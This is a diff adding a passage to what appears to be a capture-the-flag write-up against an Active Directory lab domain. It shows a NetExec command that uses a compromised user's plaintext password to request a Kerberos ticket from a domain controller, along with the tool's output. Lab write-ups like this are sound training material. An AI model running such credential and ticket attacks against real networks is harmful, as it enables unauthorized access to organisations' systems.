@@ -779,3 +779,13 @@ SMB         dc2.pong.htb    445    dc2              [+] pong.htb\c.carlssen:A()D
 
 This user is now compromised
 
+```python
+❯❯❯ faketime -f +8h nxc smb dc2.pong.htb -u 'c.carlssen' -p 'A()DUJ!@414' -k --generate-tgt c.carlssen 
+SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
+SMB         dc2.pong.htb    445    dc2              [+] pong.htb\c.carlssen:A()DUJ!@414 
+SMB         dc2.pong.htb    445    dc2              [+] TGT saved to: c.carlssen.ccache
+SMB         dc2.pong.htb    445    dc2              [+] Run the following command to use the TGT: export KRB5CCNAME=c.carlssen.ccache
+```
+
+Ill also grab a TGT for this user
+
